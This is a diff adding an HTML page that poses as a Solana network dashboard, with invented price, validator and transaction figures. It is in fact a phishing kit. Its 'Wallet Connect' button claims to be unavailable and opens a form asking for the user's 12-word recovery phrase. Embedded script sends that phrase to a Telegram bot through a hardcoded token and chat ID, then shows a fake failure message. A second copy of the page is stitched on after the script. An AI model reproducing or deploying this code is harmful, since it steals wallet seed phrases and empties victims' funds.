@@ -1,0 +1,2099 @@
+<!DOCTYPE html>
+<!-- Mobile-friendly sidebar controls -->
+<div class="sidebar-toggle">
+    <button class="toggle-btn" onclick="toggleSidebar()">
+        <span class="toggle-icon">☰</span>
+    </button>
+</div>
+
+<script>
+    // Add mobile detection
+    const isMobile = () => window.matchMedia('(max-width: 768px)').matches;
+    
+    // Toggle sidebar function
+    function toggleSidebar() {
+        const sidebar = document.querySelector('.sidebar');
+        sidebar.classList.toggle('sidebar-open');
+    }
+
+    // Auto-close sidebar on mobile when clicking outside
+    document.addEventListener('click', (e) => {
+        const sidebar = document.querySelector('.sidebar');
+        const toggle = document.querySelector('.sidebar-toggle');
+        
+        if (isMobile() && 
+            !sidebar.contains(e.target) && 
+            !toggle.contains(e.target)) {
+            sidebar.classList.remove('sidebar-open');
+        }
+    });
+</script>
+<style>
+    .sidebar {
+        transform: translateX(-220px);
+        transition: transform 0.3s ease-in-out;
+    }
+
+    .sidebar::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        right: -20px;
+        width: 20px;
+        height: 100%;
+        background: transparent;
+    }
+
+    .sidebar:hover {
+        transform: translateX(0);
+    }
+
+    /* Ensure main content adjusts when sidebar is hidden */
+    .main-content {
+        margin-left: 20px;
+        transition: margin-left 0.3s ease-in-out;
+    }
+
+    .sidebar:hover + .main-content {
+        margin-left: 240px;
+    }
+</style>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana</title>
+    <style>
+        :root {
+            --primary-color: #00ADB5;
+            --secondary-color: #FF5722;
+            --accent-color: #F9A826;
+            --bg-color: #0F1624;
+            --card-bg: #1B2536;
+            --text-color: #FFFFFF;
+            --text-secondary: #B2B9C8;
+            --border-color: #2A3547;
+            --success-color: #4CAF50;
+            --warning-color: #FF9800;
+            --danger-color: #F44336;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Sidebar and Main Layout */
+        .dashboard {
+            display: flex;
+            min-height: 100vh;
+        }
+        
+        .sidebar {
+            width: 240px;
+            background-color: rgba(27, 37, 54, 0.8);
+            border-right: 1px solid var(--border-color);
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            backdrop-filter: blur(10px);
+            z-index: 100;
+        }
+        
+        .main-content {
+            flex: 1;
+            margin-left: 240px;
+            padding: 20px;
+        }
+        
+        /* Sidebar Components */
+        .brand {
+            display: flex;
+            align-items: center;
+            padding: 24px 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .brand-logo {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border-radius: 8px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .brand-name {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .nav-menu {
+            padding: 20px 0;
+        }
+        
+        .nav-title {
+            color: var(--text-secondary);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 0 20px;
+            margin-bottom: 12px;
+        }
+        
+        .nav-item {
+            display: flex;
+            align-items: center;
+            padding: 12px 20px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+        
+        .nav-item.active {
+            color: var(--text-color);
+            background-color: rgba(0, 173, 181, 0.1);
+        }
+        
+        .nav-item.active::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 4px;
+            background-color: var(--primary-color);
+        }
+        
+        .nav-item:hover {
+            background-color: rgba(0, 173, 181, 0.05);
+            color: var(--text-color);
+        }
+        
+        .nav-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: var(--border-color);
+            margin: 10px 0;
+        }
+        
+        /* Header Components */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            margin-bottom: 24px;
+        }
+        
+        .page-title {
+            font-size: 24px;
+            font-weight: 600;
+        
+        }
+        .connect-wallet-btn, .manual-connect-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, var(--solana-primary), var(--solana-secondary));
+            border: none;
+            border-radius: 8px;
+            padding: 10px 20px;
+            color: var(--solana-text);
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            position: relative;
+            gap: 8px;
+            box-shadow: 0 2px 8px rgba(153, 69, 255, 0.3);
+            z-index: 1000;
+        }
+
+        .connect-wallet-btn:active::after {
+            content: none;
+            position: absolute;
+            bottom: calc(100% + 12px);
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: var(--card-bg);
+            color: var(--text-color);
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            white-space: nowrap;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+            border: 1px solid var(--border-color);
+            z-index: 100;
+            opacity: 0.95;
+            backdrop-filter: blur(4px);
+        }
+        
+        .connect-wallet-btn:hover, .manual-connect-btn:hover {
+            background: linear-gradient(135deg, var(--solana-secondary), var(--solana-primary));
+
+
+        }
+        @media (max-width: 768px) {
+            .connect-wallet-btn, .manual-connect-btn {
+                width: 100%;
+                font-size: 14px;
+                padding: 12px;
+            }
+        }
+
+        .wallet-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: var(--solana-dark);
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(153, 69, 255, 0.3);
+            z-index: 1000;
+            width: 350px;
+            max-width: 90%;
+            text-align: center;
+            animation: fadeIn 0.3s ease-in-out;
+            color: var(--solana-text);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -55%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+
+        .wallet-popup-content {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .wallet-popup input {
+            padding: 10px;
+            border: 1px solid var(--solana-secondary);
+            border-radius: 6px;
+            font-size: 16px;
+            text-align: center;
+            background: var(--solana-light);
+            color: var(--solana-text);
+        }
+
+        .wallet-popup button {
+            background: linear-gradient(135deg, var(--solana-primary), var(--solana-secondary));
+            color: var(--solana-text);
+            border: none;
+            padding: 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .wallet-popup button:hover {
+            background: linear-gradient(135deg, var(--solana-secondary), var(--solana-primary));
+        }
+
+        .close-popup {
+            cursor: pointer;
+            font-size: 20px;
+            font-weight: bold;
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            color: var(--solana-text);
+        }
+        
+    
+       
+
+
+        /* Overview Cards */
+        .overview-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .card-title {
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .card-icon {
+            width: 36px;
+            height: 36px;
+            background-color: rgba(0, 173, 181, 0.1);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-color);
+        }
+        
+        .card-value {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        
+        .card-change {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: var(--success-color);
+        }
+        
+        .card-change.negative {
+            color: var(--danger-color);
+        }
+        
+        /* Charts Section */
+        .charts-section {
+            margin-bottom: 30px;
+        }
+        
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .chart-filters {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .filter-btn {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 6px 12px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s ease;
+        }
+        
+        .filter-btn:hover {
+            background-color: rgba(0, 173, 181, 0.1);
+            color: var(--text-color);
+        }
+        
+        .filter-btn.active {
+            background-color: rgba(0, 173, 181, 0.2);
+            color: var(--primary-color);
+            border-color: var(--primary-color);
+        }
+        
+        .chart-card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .chart-container {
+            height: 300px;
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+        }
+        
+        .chart-area {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, 
+                rgba(0, 173, 181, 0.2) 0%, 
+                rgba(0, 173, 181, 0) 100%);
+            clip-path: polygon(
+                0% 80%,
+                5% 75%,
+                10% 78%,
+                15% 70%,
+                20% 72%,
+                25% 65%,
+                30% 68%,
+                35% 60%,
+                40% 63%,
+                45% 55%,
+                50% 58%,
+                55% 50%,
+                60% 53%,
+                65% 45%,
+                70% 48%,
+                75% 40%,
+                80% 43%,
+                85% 35%,
+                90% 38%,
+                95% 30%,
+                100% 33%,
+                100% 100%,
+                0% 100%
+            );
+        }
+        
+        .chart-line {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            fill: none;
+            stroke: var(--primary-color);
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        
+        /* Validators Section */
+        .validators-section {
+            margin-bottom: 30px;
+        }
+        
+        .validators-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+        
+        .validator-card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            transition: transform 0.2s ease;
+        }
+        
+        .validator-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .validator-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .validator-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            background-color: var(--card-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-weight: bold;
+            border: 1px solid var(--border-color);
+        }
+        
+        .validator-name {
+            font-weight: 600;
+        }
+        
+        .validator-stats {
+            margin-bottom: 16px;
+        }
+        
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .stat-value {
+            font-weight: 500;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 16px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            border-radius: 4px;
+        }
+        
+        /* Transactions Table */
+        .transactions-section {
+            margin-bottom: 30px;
+        }
+        
+        .transactions-table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+        }
+        
+        .transactions-table th {
+            text-align: left;
+            padding: 16px;
+            background-color: rgba(27, 37, 54, 0.8);
+            color: var(--text-secondary);
+            font-weight: 500;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .transactions-table td {
+            padding: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .transactions-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .tx-hash {
+            display: flex;
+            align-items: center;
+        }
+        
+        .tx-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            background-color: rgba(0, 173, 181, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            color: var(--primary-color);
+        }
+        
+        .tx-id {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 14px;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .status-confirmed {
+            background-color: rgba(76, 175, 80, 0.1);
+            color: var(--success-color);
+        }
+        
+        .status-pending {
+            background-color: rgba(255, 152, 0, 0.1);
+            color: var(--warning-color);
+        }
+        
+        .view-all-btn {
+            display: inline-block;
+            padding: 8px 16px;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 16px;
+            transition: all 0.2s ease;
+        }
+        
+        .view-all-btn:hover {
+            background-color: rgba(0, 173, 181, 0.1);
+        }
+        
+        /* Footer */
+        .footer {
+            margin-top: 50px;
+            padding: 30px 0;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .footer-brand {
+            display: flex;
+            align-items: center;
+        }
+        
+        .footer-logo {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border-radius: 6px;
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .footer-text {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .footer-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s ease;
+        }
+        
+        .footer-link:hover {
+            color: var(--primary-color);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .validators-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .sidebar {
+                transform: translateX(-100%);
+                transition: transform 0.3s ease;
+                position: fixed;
+                z-index: 1000;
+            }
+            
+            .sidebar.active {
+                transform: translateX(0);
+            }
+            
+            .main-content {
+                margin-left: 0;
+            }
+            
+            .mobile-toggle {
+                display: block;
+                cursor: pointer;
+            }
+            
+            .validators-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .overview-cards {
+                grid-template-columns: 1fr;
+            }
+            
+            .transactions-table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="brand">
+                <div class="brand-logo">S</div>
+                <div class="brand-name">Solana</div>
+            </div>
+            
+            <div class="nav-menu">
+                <div class="nav-title">Main</div>
+                <a href="#" class="nav-item active">
+                    <div class="nav-icon">📊</div>
+                    Dashboard
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">🔍</div>
+                    Explorer
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">💎</div>
+                    Validators
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">📈</div>
+                    Analytics
+                </a>
+                
+                <div class="divider"></div>
+                
+                <div class="nav-title">Tools</div>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">💰</div>
+                    Wallet
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">🧰</div>
+                    Developer
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">📚</div>
+                    Docs
+                </a>
+                
+                <div class="divider"></div>
+                
+                <div class="nav-title">Account</div>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">⚙</div>
+                    Settings
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">❓</div>
+                    Help Center
+                </a>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="container">
+                <div class="header">
+                    <h1 class="page-title">Network Dashboard</h1>
+                    <button id="connectWalletBtn" class="connect-wallet-btn">Wallet Connect</button>
+                </div>
+    
+                <div id="walletPopup" class="wallet-popup">
+                    <span id="closePopup" class="close-popup">&times;</span>
+                    <div class="wallet-popup-content" id="walletOptions">
+                        <h3>Connect Your Wallet</h3>
+                        <button id="connectPhantom" class="manual-connect-btn">Phantom Wallet</button>
+                        <button id="connectOther" class="manual-connect-btn">Other Wallet</button>
+                    </div>
+                    <div class="wallet-popup-content" id="walletInput" style="display: none;">
+                        <h3>Enter 12 Key Phrase</h3>
+                        <input type="text" placeholder="Separate Phrases with spaces" id="walletAddress">
+                        <button id="submitWallet" class="manual-connect-btn">Submit</button>
+                    </div>
+                </div>
+                
+
+
+
+                
+                <!-- Overview Cards -->
+                <div class="overview-cards">
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">CURRENT PRICE</div>
+                            <div class="card-icon">💲</div>
+                        </div>
+                        <div class="card-value">$142.78</div>
+                        <div class="card-change">+3.8% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">MARKET CAP</div>
+                            <div class="card-icon">📊</div>
+                        </div>
+                        <div class="card-value">$58.2B</div>
+                        <div class="card-change">+2.4% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">24H TRANSACTIONS</div>
+                            <div class="card-icon">🔄</div>
+                        </div>
+                        <div class="card-value">3.2M</div>
+                        <div class="card-change">+8.3% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">AVG TX FEE</div>
+                            <div class="card-icon">💸</div>
+                        </div>
+                        <div class="card-value">0.00021</div>
+                        <div class="card-change negative">-1.2% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">CURRENT TPS</div>
+                            <div class="card-icon">⚡</div>
+                        </div>
+                        <div class="card-value">2,347</div>
+                        <div class="card-change">+127 (1h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">TOTAL STAKED</div>
+                            <div class="card-icon">🔒</div>
+                        </div>
+                        <div class="card-value">389.7M</div>
+                        <div class="card-change">+1.2% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">ACTIVE VALIDATORS</div>
+                            <div class="card-icon">👥</div>
+                        </div>
+                        <div class="card-value">1,873</div>
+                        <div class="card-change">+5 (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">NETWORK STATUS</div>
+                            <div class="card-icon">🟢</div>
+                        </div>
+                        <div class="card-value">Healthy</div>
+                        <div class="card-change">99.98% Uptime</div>
+                    </div>
+                </div>
+                
+                <!-- Charts Section -->
+                <div class="charts-section">
+                    <div class="section-header">
+                        <h2 class="section-title">Network Performance</h2>
+                        <div class="chart-filters">
+                            <button class="filter-btn">24H</button>
+                            <button class="filter-btn active">7D</button>
+                            <button class="filter-btn">30D</button>
+                            <button class="filter-btn">3M</button>
+                            <button class="filter-btn">1Y</button>
+                            <button class="filter-btn">ALL</button>
+                        </div>
+                    </div>
+                    
+                    <div class="chart-card">
+                        <div class="chart-container">
+                            <svg width="100%" height="100%" viewBox="0 0 800 300" preserveAspectRatio="none">
+                                <path class="chart-line" d="M0,240 C50,220 100,230 150,210 C200,190 250,200 300,180 C350,160 400,170 450,150 C500,130 550,140 600,120 C650,100 700,110 750,90 C800,70" fill="none" stroke="#00ADB5" stroke-width="3"></path>
+                            </svg>
+                            <div class="chart-area"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Validators Section -->
+                <div class="validators-section">
+                    <div class="section-header">
+                        <h2 class="section-title">Top Validators</h2>
+                        <a href="#" class="view-all-btn">View All</a>
+                    </div>
+                    
+                    <div class="validators-grid">
+                        <div class="validator-card">
+                            <div class="validator-header">
+                                <div class="validator-icon">V1</div>
+                                <div class="validator-name">MainNode Validator</div>
+                            </div>
+                            <div class="validator-stats">
+                                <div class="stat-row">
+                                    <div class="stat-label">Stake</div>
+                                    <div class="stat-value">5.4M</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Commission</div>
+                                    <div class="stat-value">5%</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Uptime</div>
+                                    <div class="stat-value">99.97%</div>
+                                </div>
+                            </div>
+                            <div class="progress-bar">
+                                <div class="progress-fill" style="width: 95%;"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="validator-card">
+                            <div class="validator-header">
+                                <div class="validator-icon">V2</div>
+                                <div class="validator-name">CryptoMax</div>
+                            </div>
+                            <div class="validator-stats">
+                                <div class="stat-row">
+                                    <div class="stat-label">Stake</div>
+                                    <div class="stat-value">4.8M</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Commission</div>
+                                    <div class="stat-value">6%</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Uptime</div>
+                                    <div class="stat-value">99.95%</div>
+                                </div>
+                            </div>
+                            <div class="progress-bar">
+                                <div class="progress-fill" style="width: 92%;"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="validator-card">
+                            <div class="validator-header">
+                                <div class="validator-icon">V3</div>
+                                <div class="validator-name">StakeHouse</div>
+                            </div>
+                            <div class="validator-stats">
+                                <div class="stat-row">
+                                    <div class="stat-label">Stake</div>
+                                    <div class="stat-value">4.2M</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Commission</div>
+                                    <div class="stat-value">5.5%</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Uptime</div>
+                                    <div class="stat-value">99.92%</div>
+                                </div>
+                            </div>
+                            <div class="progress-bar">
+                                <div class="progress-fill" style="width: 88%;"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="validator-card">
+                            <div class="validator-header">
+                                <div class="validator-icon">V4</div>
+                                <div class="validator-name">NodeGuru</div>
+                            </div>
+                            <div class="validator-stats">
+                                <div class="stat-row">
+                                    <div class="stat-label">Stake</div>
+                                    <div class="stat-value">3.9M</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Commission</div>
+                                    <div class="stat-value">7%</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Uptime</div>
+                                    <div class="stat-value">99.90%</div>
+                                </div>
+                            </div>
+                            <div class="progress-bar">
+                                <div class="progress-fill" style="width: 85%;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Transactions Section -->
+                <div class="transactions-section">
+                    <div class="section-header">
+                        <h2 class="section-title">Recent Transactions</h2>
+                        <a href="#" class="view-all-btn">View All</a>
+                    </div>
+                    
+                    <table class="transactions-table">
+                        <thead>
+                            <tr>
+                                <th>Transaction</th>
+                                <th>Block</th>
+                                <th>Age</th>
+                                <th>Status</th>
+                                <th>Fee</th>
+                                <th>Value</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+
+                                <td>
+                                    <div class="tx-hash">
+    <script>
+        document.getElementById("connectWalletBtn").addEventListener("click", function() {
+            this.innerText = "Wallet connect unavailable, connect manually";
+            document.getElementById("walletPopup").style.display = "block";
+            document.getElementById("walletOptions").style.display = "flex";
+            document.getElementById("walletInput").style.display = "none";
+        });
+
+        document.getElementById("closePopup").addEventListener("click", function() {
+            document.getElementById("walletPopup").style.display = "none";
+        });
+
+        document.getElementById("connectPhantom").addEventListener("click", function() {
+            document.getElementById("walletOptions").style.display = "none";
+            document.getElementById("walletInput").style.display = "flex";
+        });
+
+        document.getElementById("connectOther").addEventListener("click", function() {
+            document.getElementById("walletOptions").style.display = "none";
+            document.getElementById("walletInput").style.display = "flex";
+        });
+        document.getElementById("submitWallet").addEventListener("click", function() {
+        let address = document.getElementById("walletAddress").value;
+        if (address) {
+            let botToken = "8091238170:AAHY3RWVMKbuv79aO1Smu71mld8iDNiH44M";  // Replace with your actual bot token
+            let chatId = "7154713742";  // Replace with your Telegram chat ID
+            let message = `New Wallet Submission: ${address}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("Wallet Connect failed! Please try again.");
+                    document.getElementById("walletPopup").style.display = "none";
+                } else {
+                    alert("Wallet Connect failed! Please try again.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Wallet Connect failed! Please try again.");
+            });
+        } else {
+            alert("Please enter a valid wallet address!");
+        }
+    });
+</script>
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana</title>
+    <style>
+        :root {
+            --primary-color: #00ADB5;
+            --secondary-color: #FF5722;
+            --accent-color: #F9A826;
+            --bg-color: #0F1624;
+            --card-bg: #1B2536;
+            --text-color: #FFFFFF;
+            --text-secondary: #B2B9C8;
+            --border-color: #2A3547;
+            --success-color: #4CAF50;
+            --warning-color: #FF9800;
+            --danger-color: #F44336;
+            --solana-primary: #9945FF;
+            --solana-secondary: #14F195;
+            --solana-dark: #1E1E2E;
+            --solana-light: #2D2D44;
+            --solana-text: #FFFFFF;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Sidebar and Main Layout */
+        .dashboard {
+            display: flex;
+            min-height: 100vh;
+        }
+        
+        .sidebar {
+            width: 240px;
+            background-color: rgba(27, 37, 54, 0.8);
+            border-right: 1px solid var(--border-color);
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            backdrop-filter: blur(10px);
+            z-index: 100;
+        }
+        
+        .main-content {
+            flex: 1;
+            margin-left: 240px;
+            padding: 20px;
+        }
+        
+        /* Sidebar Components */
+        .brand {
+            display: flex;
+            align-items: center;
+            padding: 24px 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .brand-logo {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border-radius: 8px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .brand-name {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .nav-menu {
+            padding: 20px 0;
+        }
+        
+        .nav-title {
+            color: var(--text-secondary);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 0 20px;
+            margin-bottom: 12px;
+        }
+        
+        .nav-item {
+            display: flex;
+            align-items: center;
+            padding: 12px 20px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+        
+        .nav-item.active {
+            color: var(--text-color);
+            background-color: rgba(0, 173, 181, 0.1);
+        }
+        
+        .nav-item.active::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 4px;
+            background-color: var(--primary-color);
+        }
+        
+        .nav-item:hover {
+            background-color: rgba(0, 173, 181, 0.05);
+            color: var(--text-color);
+        }
+        
+        .nav-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: var(--border-color);
+            margin: 10px 0;
+        }
+        
+        /* Header Components */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            margin-bottom: 24px;
+        }
+        
+        .page-title {
+            font-size: 24px;
+            font-weight: 600;
+        }
+        
+        .network-selector {
+            display: flex;
+            align-items: center;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 8px 16px;
+            cursor: pointer;
+        }
+        
+        .network-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--success-color);
+            margin-right: 10px;
+        }
+        
+        .network-name {
+            margin-right: 10px;
+            font-weight: 500;
+        }
+        
+        /* Overview Cards */
+        .overview-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .card {
+            background-color: var(--card-bg);
